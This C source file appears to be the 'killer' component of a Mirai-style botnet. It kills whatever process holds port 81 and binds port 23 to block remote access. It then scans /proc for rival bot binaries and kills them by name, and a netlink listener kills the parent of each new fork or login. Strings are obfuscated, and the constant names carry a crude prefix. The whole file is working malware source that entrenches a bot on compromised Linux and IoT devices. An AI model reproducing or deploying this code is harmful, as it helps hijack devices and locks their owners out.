#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>
#include <errno.h>
#include <time.h>
#include <stdbool.h>

#include "h/i.h"
#include "h/k.h"
#include "h/x.h"
#include "h/u.h"

int killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;


    if(killer_kill_by_port(htons(81)))
    {
        tmp_bind_addr.sin_port = htons(23);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }

    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    #ifdef DEBUG
       printf("[killer] memory scanning processes\n");
    #endif

    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;

        t_u_v(RAPE_K_PROC);
        if((dir = opendir(t_r_v(RAPE_K_PROC, NULL))) == NULL)
        {
            #ifdef DEBUG
               printf("[killer] failed to open /proc!\n");
            #endif
            break;
        }
        t_l_v(RAPE_K_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;
            char cmdline_path[64], *ptr_cmdline_path = cmdline_path;
            char maps_path[64], *ptr_maps_path = maps_path, realpath[PATH_MAX];
            int rp_len = 0, fd = 0, pid = util_atoi(file->d_name, 10);

            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    #ifdef DEBUG
                       printf("[killer] %d seconds have passed since last scan. re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
                    #endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            t_u_v(RAPE_K_PROC);
            t_u_v(RAPE_K_MAPS);
            t_u_v(RAPE_K_CMDLINE);

            #ifdef DEBUG
               printf("[killer] scanning pid %d\n", pid);
            #endif

            ptr_maps_path += util_strcpy(ptr_maps_path, t_r_v(RAPE_K_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, t_r_v(RAPE_K_MAPS, NULL));
            ptr_cmdline_path += util_strcpy(ptr_cmdline_path, t_r_v(RAPE_K_CMDLINE, NULL));

            #ifdef DEBUG
               printf("[maps_killer scanning %s\n", maps_path);;
            #endif

               #ifdef DEBUG
               printf("[cmdline_killer] scanning %s\n", cmdline_path);;
            #endif

            t_l_v(RAPE_K_PROC);
            t_l_v(RAPE_K_MAPS);
            t_l_v(RAPE_K_CMDLINE);

            if(maps_scan_match(maps_path))
            {
                #ifdef DEBUG
               printf("[maps_killer] killing prosses pid %s\n", pid);;
            #endif
                kill(pid, 9);
            }

             if(cmdline_scan_match(cmdline_path))
            {
                 #ifdef DEBUG
               printf("[cmdline_killer] killing prosses pid %s\n", pid);;
            #endif
                kill(pid, 9);
            }
            util_zero(cmdline_path, sizeof (cmdline_path));
            util_zero(maps_path, sizeof(maps_path));

            sleep(1);
        }

        closedir(dir);
    }

    #ifdef DEBUG
       printf("[killer] finished\n");
    #endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    #ifdef DEBUG
       printf("[killer] finding and killing processes holding port %d\n", ntohs(port));
    #endif

    util_itoa(ntohs(port), 16, port_str);
    if(util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    t_u_v(RAPE_K_PROC);
    t_u_v(RAPE_K_EXE);
    t_u_v(RAPE_K_FD);
    t_u_v(RAPE_K_TCP);

    fd = open(t_r_v(RAPE_K_TCP, NULL), O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if(in_column == TRUE)
                        column_index++;

                    if(in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if(listening_state == FALSE)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }

    close(fd);

    if(util_strlen(inode) == 0)
    {
        #ifdef DEBUG
           printf("failed to find inode for port %d\n", ntohs(port));
        #endif

        t_l_v(RAPE_K_PROC);
        t_l_v(RAPE_K_EXE);
        t_l_v(RAPE_K_FD);
        t_l_v(RAPE_K_TCP);

        return 0;
    }

    #ifdef DEBUG
       printf("found inode \"%s\" for port %d\n", inode, ntohs(port));
    #endif

    if((dir = opendir(t_r_v(RAPE_K_PROC, NULL))) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if(*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, t_r_v(RAPE_K_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), t_r_v(RAPE_K_EXE, NULL));

            if(readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, t_r_v(RAPE_K_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), t_r_v(RAPE_K_FD, NULL));
            if((fd_dir = opendir(path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, t_r_v(RAPE_K_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), t_r_v(RAPE_K_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if(readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if(util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    t_l_v(RAPE_K_PROC);
    t_l_v(RAPE_K_EXE);
    t_l_v(RAPE_K_FD);
    t_l_v(RAPE_K_TCP);

    return ret;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    t_u_v(RAPE_K_TCP);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, t_r_v(RAPE_K_TCP, NULL), util_strlen(t_r_v(RAPE_K_TCP, NULL)))) 
        {
            found = TRUE;
            break;
        }
    }

    t_l_v(RAPE_K_TCP);

    close(fd);

    return found;
}



static BOOL cmdline_scan_match(char *path)
{
    int fd, ret, ii, s, curr_points = 0, num_alphas, num_count, points_to_kill = 3;
    char rdbuf[4096];
    BOOL found = FALSE;
 
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
 
    t_u_v(T_K_TMP);
    t_u_v(T_K_DATALOCAL);
    t_u_v(T_K_QTX);
    t_u_v(T_K_DOT);
    t_u_v(T_K_QTX2);
    t_u_v(T_K_SDA);
    t_u_v(T_K_MTD);
   
 
    t_u_v(T_K_mips);
    t_u_v(T_K_mpsl);
    t_u_v(T_K_sh4);
    t_u_v(T_K_x86);
    t_u_v(T_K_arm6);
    t_u_v(T_K_i686);
    t_u_v(T_K_ppc);
    t_u_v(T_K_i586);
    t_u_v(T_K_m68k);
    t_u_v(T_K_spc);
    t_u_v(T_K_arm);
    t_u_v(T_K_arm5);
    t_u_v(T_K_ppc440);
    t_u_v(T_K_arm7);
    t_u_v(T_K_arc);
    t_u_v(T_K_mips64);
    t_u_v(T_K_arm4);
    t_u_v(T_K_arm3);
    t_u_v(T_K_x86_32);
 
 
 
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_TMP, NULL), util_strlen(t_r_v(T_K_TMP, NULL))) ||
           mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_DATALOCAL, NULL), util_strlen(t_r_v(T_K_DATALOCAL, NULL))) ||
           mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_QTX, NULL), util_strlen(t_r_v(T_K_QTX, NULL))) ||
           mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_QTX2, NULL), util_strlen(t_r_v(T_K_QTX2, NULL)))
           )
            found = TRUE;
 
        if(mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_DOT, NULL), util_strlen(t_r_v(T_K_DOT, NULL))) &&
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_mpsl, NULL), util_strlen(t_r_v(T_K_mpsl, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_sh4, NULL), util_strlen(t_r_v(T_K_sh4, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_x86, NULL), util_strlen(t_r_v(T_K_x86, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm6, NULL), util_strlen(t_r_v(T_K_arm6, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_i686, NULL), util_strlen(t_r_v(T_K_i686, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_ppc, NULL), util_strlen(t_r_v(T_K_ppc, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_i586, NULL), util_strlen(t_r_v(T_K_i586, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_m68k, NULL), util_strlen(t_r_v(T_K_m68k, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_spc, NULL), util_strlen(t_r_v(T_K_spc, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm, NULL), util_strlen(t_r_v(T_K_arm, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm5, NULL), util_strlen(t_r_v(T_K_arm5, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_ppc440, NULL), util_strlen(t_r_v(T_K_ppc440, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm7, NULL), util_strlen(t_r_v(T_K_arm7, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arc, NULL), util_strlen(t_r_v(T_K_arc, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_mips64, NULL), util_strlen(t_r_v(T_K_mips64, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm4, NULL), util_strlen(t_r_v(T_K_arm4, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm3, NULL), util_strlen(t_r_v(T_K_arm4, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_x86_32, NULL), util_strlen(t_r_v(T_K_x86_32, NULL)))
 
 
           )
            found = TRUE;
 
        if(!mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_SDA, NULL), util_strlen(t_r_v(T_K_SDA, NULL))) &&
           !mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_MTD, NULL), util_strlen(t_r_v(T_K_MTD, NULL))))
        {
            for (ii = 0; ii < util_strlen(rdbuf); ii++)
            {
                if(s == 0)
                {
                    if ((rdbuf[ii] >= 'a' && rdbuf[ii] <= 'Z'))
                    {
                        if(curr_points >= 5) //if its more than or 1 we know we had a int before it, Strange :thinking:
                            curr_points++;
 
                        s = 1;
                        num_alphas++;
                    }  
                }
                else if (rdbuf[ii] >= '0' && rdbuf[ii] <= '9')
                {
                    s = 0;
                    curr_points++;
                    num_count++;
                }
            }
            if (curr_points >= points_to_kill)
            {
                found = TRUE;
            }
        }
    }
 
    close(fd);
 
   t_l_v(T_K_TMP);
   t_l_v(T_K_DATALOCAL);
   t_l_v(T_K_QTX);
   t_l_v(T_K_DOT);
   t_l_v(T_K_QTX2);
   t_l_v(T_K_SDA);
   t_l_v(T_K_MTD);
   
    t_l_v(T_K_mips);
    t_l_v(T_K_mpsl);
    t_l_v(T_K_sh4);
    t_l_v(T_K_x86);
    t_l_v(T_K_arm6);
    t_l_v(T_K_i686);
    t_l_v(T_K_ppc);
    t_l_v(T_K_i586);
    t_l_v(T_K_m68k);
    t_l_v(T_K_spc);
    t_l_v(T_K_arm);
    t_l_v(T_K_arm5);
    t_l_v(T_K_ppc440);
    t_l_v(T_K_arm7);
    t_l_v(T_K_arc);
    t_l_v(T_K_mips64);
    t_l_v(T_K_arm4);
    t_l_v(T_K_arm3);
    t_l_v(T_K_x86_32);
 
 
 
    return found;
}


static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return FALSE;

    while(buf_len--)
    {
        if(*buf++ == str[matches])
        {
            if(++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

/*
 * connect to netlink
 * returns netlink socket, or -1 on error
 */
static int nl_connect()
{
    int rc;
    int nl_sock;
    struct sockaddr_nl sa_nl;

    nl_sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);
    if (nl_sock == -1) {
        perror("socket");
        return -1;
    }

    sa_nl.nl_family = AF_NETLINK;
    sa_nl.nl_groups = CN_IDX_PROC;
    sa_nl.nl_pid = getpid();

    rc = bind(nl_sock, (struct sockaddr *)&sa_nl, sizeof(sa_nl));
    if (rc == -1) {
        perror("bind");
        close(nl_sock);
        return -1;
    }

    return nl_sock;
}

/*
 * subscribe on proc events (process notifications)
 */
static int set_proc_ev_listen(int nl_sock, bool enable)
{
    int rc;
    struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
        struct nlmsghdr nl_hdr;
        struct __attribute__ ((__packed__)) {
            struct cn_msg cn_msg;
            enum proc_cn_mcast_op cn_mcast;
        };
    } nlcn_msg;

    memset(&nlcn_msg, 0, sizeof(nlcn_msg));
    nlcn_msg.nl_hdr.nlmsg_len = sizeof(nlcn_msg);
    nlcn_msg.nl_hdr.nlmsg_pid = getpid();
    nlcn_msg.nl_hdr.nlmsg_type = NLMSG_DONE;

    nlcn_msg.cn_msg.id.idx = CN_IDX_PROC;
    nlcn_msg.cn_msg.id.val = CN_VAL_PROC;
    nlcn_msg.cn_msg.len = sizeof(enum proc_cn_mcast_op);

    nlcn_msg.cn_mcast = enable ? PROC_CN_MCAST_LISTEN : PROC_CN_MCAST_IGNORE;

    rc = send(nl_sock, &nlcn_msg, sizeof(nlcn_msg), 0);
    if (rc == -1) {
        perror("netlink send");
        return -1;
    }

    return 0;
}

/*
 * handle a single process event
 */
static volatile bool need_exit = false;
static int handle_proc_ev(int nl_sock)
{
    int rc;
    struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
        struct nlmsghdr nl_hdr;
        struct __attribute__ ((__packed__)) {
            struct cn_msg cn_msg;
            struct proc_event proc_ev;
        };
    } nlcn_msg;

    while (!need_exit) {
        rc = recv(nl_sock, &nlcn_msg, sizeof(nlcn_msg), 0);
        if (rc == 0) {
            /* shutdown? */
            return 0;
        } else if (rc == -1) {
            if (errno == EINTR) continue;
            perror("netlink recv");
            return -1;
        }
        switch (nlcn_msg.proc_ev.what) {
            case PROC_EVENT_NONE:
                printf("[killer] set mcast listen ok\n");
                break;
            case PROC_EVENT_FORK:
                printf("[killer] new login: killing pid=%d\n",
                        nlcn_msg.proc_ev.event_data.fork.parent_pid);
                        kill(nlcn_msg.proc_ev.event_data.fork.parent_pid, 9);
                break;
            default:
                printf("unhandled proc event\n");
                break;
        }
    }

    return 0;
}

static void on_sigint(int unused)
{
    need_exit = true;
}

int netlink_killer()
{
    int nl_sock;
    int rc = EXIT_SUCCESS;

    signal(SIGINT, &on_sigint);
    siginterrupt(SIGINT, true);

    nl_sock = nl_connect();
    if (nl_sock == -1)
        exit(EXIT_FAILURE);

    rc = set_proc_ev_listen(nl_sock, true);
    if (rc == -1) {
        rc = EXIT_FAILURE;
        goto out;
    }

    rc = handle_proc_ev(nl_sock);
    if (rc == -1) {
        rc = EXIT_FAILURE;
        goto out;
    }

    set_proc_ev_listen(nl_sock, false);

out:
    close(nl_sock);
    exit(rc);
}